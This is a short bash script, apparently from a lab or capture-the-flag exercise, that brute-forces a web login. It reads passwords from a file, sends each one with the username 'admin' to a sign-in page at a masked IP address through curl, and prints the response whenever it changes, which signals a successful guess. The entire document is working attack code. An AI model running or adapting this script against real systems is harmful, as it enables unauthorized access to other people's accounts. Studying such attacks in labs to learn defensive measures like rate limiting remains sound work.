#!/bin/bash
PASSWORD_FILE="passwords.txt"
OLDRESPONSE=""
while IFS= read -r password; do
  echo "Testing password: $password"
  
  RESPONSE=$(curl -s "http://XX.XX.XX.XX/index.php?page=signin&username=admin&password=$password&Login=Login#")
  if [ "$RESPONSE" != "$OLDRESPONSE" ]; then
    echo "New response: $RESPONSE"
  fi
  OLDRESPONSE="$RESPONSE"
done < "$PASSWORD_FILE"